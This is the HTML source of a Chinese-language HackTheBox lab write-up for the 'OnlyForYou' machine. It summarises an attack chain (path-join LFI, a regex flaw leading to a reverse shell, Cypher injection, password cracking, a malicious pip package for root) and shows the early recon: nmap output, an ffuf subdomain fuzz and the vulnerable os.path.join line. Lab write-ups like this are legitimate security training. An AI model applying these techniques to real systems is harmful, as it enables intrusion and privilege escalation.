@@ -1,0 +1,790 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <!-- bing -->
+  <meta name="msvalidate.01" content="D6E6F0AB3EAD6BA4F5541EDCB8EEDCC5" />
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- clarity -->
+  <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "ph6eztilds");
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P OnlyForYou​​ https:&#x2F;&#x2F;www.hackthebox.com&#x2F;achievement&#x2F;machine&#x2F;463126&#x2F;540 首先使用 nmap 掃描目">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - OnlyForYou">
+<meta property="og:url" content="https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P OnlyForYou​​ https:&#x2F;&#x2F;www.hackthebox.com&#x2F;achievement&#x2F;machine&#x2F;463126&#x2F;540 首先使用 nmap 掃描目">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083918-2hwarnt.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225051653-ryzb1aa.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225051714-hoxkrjr.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225051733-ebqr943.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225051944-y6ajfil.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225052044-wycnf41.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225052120-hg9cavt.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225052346-7bo26zx.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225052623-b5eovup.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225052517-zbtsfl9.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225052534-wdb382l.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225052548-b84ll5s.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225052648-dtm2hcy.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225053354-e4ds1z8.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225053432-td9xsby.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225231953-fdg8mar.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225053544-xejc324.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225053606-2tgtedk.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225053704-cdhha5f.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054340-jj9njuc.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054250-6w4b1tr.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054404-dlbz3ay.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054510-tr7ikim.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225232958-1w43r4t.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054611-ekypzrw.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225233226-tumzjuw.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054729-6lwif9p.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054812-pegbup8.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054831-m97i202.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054850-xf3znza.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054905-8u6xid1.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225054938-lb1we3k.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225055011-5hpuabo.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225055134-sadci9m.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225055125-57any7i.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225055509-cb83xe8.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225064426-lr04nkh.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225065235-zizyse4.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225061229-jn0ufhs.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225072045-oringaa.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225071946-jkd5uzc.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225071935-p98diut.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225075532-sn9edeb.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225075546-a5zjkmm.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225080143-7p5zgzn.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225081618-ncildrw.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225081820-kud79l2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225082705-uvay7le.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225082816-tw73imr.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225082829-caqvcn3.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083115-lrjk54j.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083046-qcp33kq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083140-i9qplww.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083253-4v0f7n0.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083417-4gtx5bm.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083408-tbx3p0c.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083451-doq8hom.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083553-1x222qa.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083606-mwn9vch.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083730-udttxnj.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083739-fwylkm1.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083753-n0a0rkq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083858-in099i1.png">
+<meta property="article:published_time" content="2024-12-27T22:05:00.000Z">
+<meta property="article:modified_time" content="2024-12-27T22:07:43.136Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083918-2hwarnt.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - OnlyForYou</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/12/28/2024-htb-machine/55-Ransom/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/12/23/2024-htb-machine/53-Unversity-p1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/&text=HackTheBox - Machine - OnlyForYou"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/&title=HackTheBox - Machine - OnlyForYou"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/&is_video=false&description=HackTheBox - Machine - OnlyForYou"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - OnlyForYou&body=Check out this article: https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/&title=HackTheBox - Machine - OnlyForYou"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/&title=HackTheBox - Machine - OnlyForYou"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/&title=HackTheBox - Machine - OnlyForYou"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/&title=HackTheBox - Machine - OnlyForYou"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/&name=HackTheBox - Machine - OnlyForYou&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/12/28/2024-htb-machine/54-OnlyForYou/&t=HackTheBox - Machine - OnlyForYou"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - OnlyForYou
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-27T22:05:00.000Z" class="dt-published" itemprop="datePublished">2024-12-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="OnlyForYou"><a href="#OnlyForYou" class="headerlink" title="OnlyForYou"></a>OnlyForYou</h1><p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225083918-2hwarnt.png" alt="image">​</p>
+<p><a target="_blank" rel="noopener" href="https://www.hackthebox.com/achievement/machine/463126/540">https://www.hackthebox.com/achievement/machine/463126/540</a></p>
+<p>首先使用 nmap 掃描目標，發現只有 80 端口開放，並找到 only4you.htb 這個域名。進一步探索子域名 beta.only4you.htb，發現可以下載源碼。分析源碼時，注意到 &#x2F;download API 使用 os.path.join 函數，允許絕對路徑，從而實現了本地文件包含（LFI）攻擊，成功讀取 &#x2F;etc&#x2F;passwd 文件。接著，使用 LFI 字典進行掃描，發現了網站的 Python 源碼文件 app.py 和 form.py。分析 form.py 時，發現可以利用正則表達式匹配漏洞，通過精心構造的 payload 獲得 reverse shell。獲得 shell 後，發現需要進行端口轉發，使用工具如 chisel 或 ligolo-ng 來實現。進一步分析內部服務，發現 3000 端口運行 Gogs，7474 端口運行 Neo4j。嘗試使用 Cypher 注入技術來獲取數據庫信息，成功獲得用戶名和密碼。通過 hashcat 破解密碼後，以 john 用戶身份登錄，發現可以以 root 權限運行 pip3。利用 pip3 的漏洞，創建惡意軟件包並上傳至 Gogs，最終通過 pip3 download 命令執行惡意代碼，成功獲得 root 權限。</p>
+<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><p>一開始肯定是使用nmap掃一下。</p>
+<h2 id="Nmap-Tcp-scan"><a href="#Nmap-Tcp-scan" class="headerlink" title="Nmap Tcp scan"></a>Nmap Tcp scan</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 e8:83:e0:a9:fd:43:<span class="built_in">df</span>:38:19:8a:aa:35:43:84:11:ec (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDX7r34pmJ6U9KrHg0/WDdrofcOXqTr13Iix+3D5ChuYwY2fmqIBlfuDo0Cz0xLnb/jaT3ODuDtmAih6unQluWw3RAf03l/tHxXfvXlWBE3I7uDu+roHQM7+hyShn+559JweJlofiYKHjaErMp33DI22BjviMrCGabALgWALCwjqaV7Dt6ogSllj+09trFFwr2xzzrqhQVMdUdljle99R41Hzle7QTl4maonlUAdd2Ok41ACIu/N2G/iE61snOmAzYXGE8X6/7eqynhkC4AaWgV8h0CwLeCCMj4giBgOo6EvyJCBgoMp/wH/90U477WiJQZrjO9vgrh2/cjLDDowpKJDrDIcDWdh0aE42JVAWuu7IDrv0oKBLGlyznE1eZsX2u1FH8EGYXkl58GrmFbyIT83HsXjF1+rapAUtG0Zi9JskF/DPy5+1HDWJShfwhLsfqMuuyEdotL4Vzw8ZWCIQ4TVXMUwFfVkvf410tIFYEUaVk5f9pVVfYvQsCULQb+/uc=</span><br><span class="line">|   256 83:f2:35:22:9b:03:86:0c:16:cf:b3:fa:9f:5a:<span class="built_in">cd</span>:08 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAz/tMC3s/5jKIZRgBD078k7/6DY8NBXEE8ytGQd9DjIIvZdSpwyOzeLABxydMR79kDrMyX+vTP0VY5132jMo5w=</span><br><span class="line">|   256 44:5f:7a:a3:77:69:0a:77:78:9b:04:e0:9f:11:db:80 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOqatISwZi/EOVbwqfFbhx22EEv6f+8YgmQFknTvg0wr</span><br><span class="line">80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://only4you.htb/</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>看起來只是開了80端口。</p>
+<h2 id="Fuzzing-sub-domain"><a href="#Fuzzing-sub-domain" class="headerlink" title="Fuzzing sub-domain"></a>Fuzzing sub-domain</h2><p>從上面的結果中可以看到存在 <code>only4you.htb</code>​ 這個域名，所以可以簡單的掃一下子域名：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -u <span class="string">&quot;http://only4you.htb/&quot;</span> -H <span class="string">&quot;Host: FUZZ.only4you.htb&quot;</span> -w /Tools/Wordlists/N0kovoSubdomains/n0kovo_subdomains_small.txt -<span class="built_in">fc</span> 301</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225051653-ryzb1aa.png" alt="image">​</p>
+<p>發現了一個  <code>beta</code>​ ，把它加進去 <code>/etc/hosts</code>​ 裏。</p>
+<h2 id="only4you-htb"><a href="#only4you-htb" class="headerlink" title="only4you.htb"></a>only4you.htb</h2><p>首先先大概看一下 <code>only4you.htb</code>​ 這個網頁的内容：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225051714-hoxkrjr.png" alt="image">​</p>
+<p>什麽也沒有看到。</p>
+<h2 id="beta-only4you-htb"><a href="#beta-only4you-htb" class="headerlink" title="beta.only4you.htb"></a>beta.only4you.htb</h2><p>所以先看一下子域名： <code>beta.only4you.htb</code>​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225051733-ebqr943.png" alt="image">​</p>
+<p>點擊 <code>Source Code</code>​ 之後可以下載源碼，所以看一下源碼長什麽樣子。</p>
+<h1 id="Source-code-review-for-beta-only4you-htb"><a href="#Source-code-review-for-beta-only4you-htb" class="headerlink" title="Source code review for beta.only4you.htb"></a>Source code review for beta.only4you.htb</h1><p>在這個源代碼中發現 <code>/download</code>​ 的 api 中調用了 <code>os.path.join</code>​ 這個函數：<br><img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-L103fH49novBlG2F-OnlyForYou/image-20241225051944-y6ajfil.png" alt="image">​</p>
+<p>在第一個條件中不允許 <code>..</code>​ ，也就是相對路徑，但如果傳遞的是絕對路徑會發生什麽？也就是這行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename = os.path.join(app.config[<span class="string">&#x27;LIST_FOLDER&#x27;</span>], filename)</span><br></pre></td></tr></table></figure>
+
+<p>根據<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/file-inclusion#python-root-element">這篇文章</a>，儅第二個參數是絕對路徑，結果就會被取代成絕對路徑：</p>
